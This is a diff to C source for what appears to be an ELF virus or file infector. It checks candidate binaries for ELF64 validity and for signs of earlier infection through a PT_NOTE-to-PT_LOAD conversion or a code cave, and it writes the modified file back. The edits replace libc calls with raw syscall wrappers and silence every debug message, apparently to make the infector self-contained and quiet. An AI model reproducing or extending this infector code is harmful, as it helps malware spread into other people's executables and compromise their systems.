@@ -43,25 +43,25 @@ int dump_obj(t_env *env)
 {
 	int fd;
 
-	if ((fd = open(env->obj_name, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
+	if ((fd = syscall_open_3(env->obj_name, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
 	{
-		if (DEBUG) printf("Error creating '%s' file.\n", env->obj_name);
+		//if (DEBUG) printf("Error creating '%s' file.\n", env->obj_name);
 		return (-1);
 	}
-	write(fd, env->obj_cpy, env->new_obj_size);
-	close(fd);
+	syscall_write(fd, env->obj_cpy, env->new_obj_size);
+	syscall_close(fd);
 	return (0);
 }
 
 int check_corruption(void *obj, size_t size, char *obj_name) {
-
+	(void)obj_name;
 	if (((char*)obj)[0] != 0x7f || \
 		((char*)obj)[1] != 'E' || \
 		((char*)obj)[2] != 'L' || \
 		((char*)obj)[3] != 'F' || \
 		((char*)obj)[4] != ELFCLASS64)
 	{
-		if (DEBUG) printf("%s is not an ELF64. Exiting...\n", obj_name);
+		//if (DEBUG) printf("%s is not an ELF64. Exiting...\n", obj_name);
 		return -1;
 	}
 	// get obj header
@@ -72,37 +72,37 @@ int check_corruption(void *obj, size_t size, char *obj_name) {
 	Elf64_Phdr *phdr = (Elf64_Phdr *)(obj + ehdr->e_phoff);
 	if (ehdr->e_type > 3)
 	{
-		if (DEBUG) printf("Corrupted e_type %d in %s. Exiting...\n", ehdr->e_type, obj_name);
+		//if (DEBUG) printf("Corrupted e_type %d in %s. Exiting...\n", ehdr->e_type, obj_name);
 		return -1;
 	}
 	if (ehdr->e_ehsize >= 65535 || ehdr->e_ehsize <= 0)
 	{
-		if (DEBUG) printf("Corrupted ehsize %d in %s. Exiting...\n", ehdr->e_ehsize, obj_name);
+		//if (DEBUG) printf("Corrupted ehsize %d in %s. Exiting...\n", ehdr->e_ehsize, obj_name);
 		return -1;
 	}
 	if (ehdr->e_phoff != ehdr->e_ehsize)
 	{
-		if (DEBUG) printf("Corrupted e_phoff %ld in %s. Exiting...\n", ehdr->e_phoff, obj_name);
+		//if (DEBUG) printf("Corrupted e_phoff %ld in %s. Exiting...\n", ehdr->e_phoff, obj_name);
 		return -1;
 	}
 	if (phnum >= 65535 || phnum <= 0)
 	{
-		if (DEBUG) printf("Corrupted phnum %d in %s. Exiting...\n", ehdr->e_phnum, obj_name);
+		//if (DEBUG) printf("Corrupted phnum %d in %s. Exiting...\n", ehdr->e_phnum, obj_name);
 		return -1;
 	}
 	if (ehdr->e_phentsize >= 65535 || ehdr->e_phentsize <= 0)
 	{
-		if (DEBUG) printf("Corrupted phentsize %d in %s. Exiting...\n", ehdr->e_phentsize, obj_name);
+		//if (DEBUG) printf("Corrupted phentsize %d in %s. Exiting...\n", ehdr->e_phentsize, obj_name);
 		return -1;
 	}
 	if (ehdr->e_shentsize >= 65535 || ehdr->e_shentsize <= 0)
 	{
-		if (DEBUG) printf("Corrupted shentsize %d in %s. Exiting...\n", ehdr->e_shentsize, obj_name);
+		//if (DEBUG) printf("Corrupted shentsize %d in %s. Exiting...\n", ehdr->e_shentsize, obj_name);
 		return -1;
 	}
 	if (ehdr->e_shstrndx >= 65535 || ehdr->e_shstrndx <= 0)
 	{
-		if (DEBUG) printf("Corrupted shstrndx %d in %s. Exiting...\n", ehdr->e_shstrndx, obj_name);
+		//if (DEBUG) printf("Corrupted shstrndx %d in %s. Exiting...\n", ehdr->e_shstrndx, obj_name);
 		return -1;
 	}
 	
@@ -113,7 +113,7 @@ int check_corruption(void *obj, size_t size, char *obj_name) {
 
 	if (shnum >= 65535 || shnum <= 0)
 	{
-		if (DEBUG) printf("Corrupted shnum %d in %s. Exiting...\n", ehdr->e_shnum, obj_name);
+		//if (DEBUG) printf("Corrupted shnum %d in %s. Exiting...\n", ehdr->e_shnum, obj_name);
 		return -1;
 	}
 	
@@ -121,7 +121,7 @@ int check_corruption(void *obj, size_t size, char *obj_name) {
 	Elf64_Shdr *sh_strtab = &shdr[ehdr->e_shstrndx];
 	if (sh_strtab->sh_offset >= size || sh_strtab->sh_offset <= 0)
 	{
-		if (DEBUG) printf("Corrupted shstrtab_offset %ld in %s. Exiting...\n", sh_strtab->sh_offset, obj_name);
+		//if (DEBUG) printf("Corrupted shstrtab_offset %ld in %s. Exiting...\n", sh_strtab->sh_offset, obj_name);
 		return -1;
 	}
 	const char *sh_strtab_p = obj + sh_strtab->sh_offset;
@@ -132,12 +132,12 @@ int check_corruption(void *obj, size_t size, char *obj_name) {
 	{
 		if (prev_type == PT_DYNAMIC && phdr[i].p_type == PT_LOAD)
 		{
-			if (DEBUG) printf("It is likely that %s have already been infected with PT_LOAD following a PT_NOTE. \nExiting...\n", obj_name);
+			//if (DEBUG) printf("It is likely that %s have already been infected with PT_LOAD following a PT_NOTE. \nExiting...\n", obj_name);
 			return -1;
 		}
 		if (phdr[i].p_type == 0)
 		{
-			if (DEBUG) printf("Corrupted p_type %d in %s. Exiting...\n", phdr[i].p_type, obj_name);
+			//if (DEBUG) printf("Corrupted p_type %d in %s. Exiting...\n", phdr[i].p_type, obj_name);
 			return -1;
 		}
 		// get base address
@@ -150,27 +150,27 @@ int check_corruption(void *obj, size_t size, char *obj_name) {
 		{
 			if (phdr[i].p_filesz >= 0xffffffffffffffff || (int)phdr[i].p_filesz <= 0)
 			{
-				if (DEBUG) printf("Corrupted p_filesz %ld in %s. Exiting...\n", phdr[i].p_filesz, obj_name);
+				//if (DEBUG) printf("Corrupted p_filesz %ld in %s. Exiting...\n", phdr[i].p_filesz, obj_name);
 				return -1;
 			}
 			if (phdr[i].p_memsz >= 0xffffffffffffffff || (int)phdr[i].p_memsz <= 0)
 			{
-				if (DEBUG) printf("Corrupted p_memsz %ld in %s. Exiting...\n", phdr[i].p_memsz, obj_name);
+				//if (DEBUG) printf("Corrupted p_memsz %ld in %s. Exiting...\n", phdr[i].p_memsz, obj_name);
 				return -1;
 			}
 			if (phdr[i].p_offset >= 0xffffffffffffffff)
 			{
-				if (DEBUG) printf("Corrupted p_offset %ld in %s. Exiting...\n", phdr[i].p_offset, obj_name);
+				//if (DEBUG) printf("Corrupted p_offset %ld in %s. Exiting...\n", phdr[i].p_offset, obj_name);
 				return -1;
 			}
 			if (phdr[i].p_paddr >= 0xffffffffffffffff)
 			{
-				if (DEBUG) printf("Corrupted p_paddr %ld in %s. Exiting...\n", phdr[i].p_paddr, obj_name);
+				//if (DEBUG) printf("Corrupted p_paddr %ld in %s. Exiting...\n", phdr[i].p_paddr, obj_name);
 				return -1;
 			}
 			if (phdr[i].p_vaddr >= 0xffffffffffffffff)
 			{
-				if (DEBUG) printf("Corrupted p_vaddr %ld in %s. Exiting...\n", phdr[i].p_vaddr, obj_name);
+				//if (DEBUG) printf("Corrupted p_vaddr %ld in %s. Exiting...\n", phdr[i].p_vaddr, obj_name);
 				return -1;
 			}
 		}
@@ -186,34 +186,34 @@ int check_corruption(void *obj, size_t size, char *obj_name) {
 			c = sh_strtab_p[shdr[i].sh_name + ic];
 		}
 		if (i > 0 && ic == 0) {
-			printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
+			//printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
 			return -1;
 		}
 		if ((int)shdr[i].sh_name < 0 || sh_strtab->sh_offset + shdr[i].sh_name > size)
 		{
-			if (DEBUG) printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
+			//if (DEBUG) printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
 			return -1;
 		}
-		if (strcmp(sh_strtab_p + shdr[i].sh_name, ".fini") == 0 && ehdr->e_entry - obj_base > shdr[i].sh_offset)
+		if (ft_strcmp(sh_strtab_p + shdr[i].sh_name, ".fini") == 0 && ehdr->e_entry - obj_base > shdr[i].sh_offset)
 		{
-			if (DEBUG) printf("It is likely that %s have already been infected in PT_LOAD code cave. \nExiting...\n", obj_name);
+			//if (DEBUG) printf("It is likely that %s have already been infected in PT_LOAD code cave. \nExiting...\n", obj_name);
 			return -1;
 		}
-		if (strcmp(sh_strtab_p + shdr[i].sh_name, ".text") == 0)
+		if (ft_strcmp(sh_strtab_p + shdr[i].sh_name, ".text") == 0)
 		{
 			if (shdr[i].sh_addr >= 0xffffffffffffffff || shdr[i].sh_addr <= 0)
 			{
-				if (DEBUG) printf("Corrupted sh_addr %ld in %s. Exiting...\n", shdr[i].sh_addr, obj_name);
+				//if (DEBUG) printf("Corrupted sh_addr %ld in %s. Exiting...\n", shdr[i].sh_addr, obj_name);
 				return -1;
 			}
 			if (shdr[i].sh_offset >= 0xffffffffffffffff || shdr[i].sh_offset <= 0)
 			{
-				if (DEBUG) printf("Corrupted sh_offset %ld in %s. Exiting...\n", shdr[i].sh_offset, obj_name);
+				//if (DEBUG) printf("Corrupted sh_offset %ld in %s. Exiting...\n", shdr[i].sh_offset, obj_name);
 				return -1;
 			}
 			if (shdr[i].sh_size >= 0xffffffffffffffff || shdr[i].sh_size <= 0)
 			{
-				if (DEBUG) printf("Corrupted sh_size %ld in %s. Exiting...\n", shdr[i].sh_size, obj_name);
+				//if (DEBUG) printf("Corrupted sh_size %ld in %s. Exiting...\n", shdr[i].sh_size, obj_name);
 				return -1;
 			}
 		}
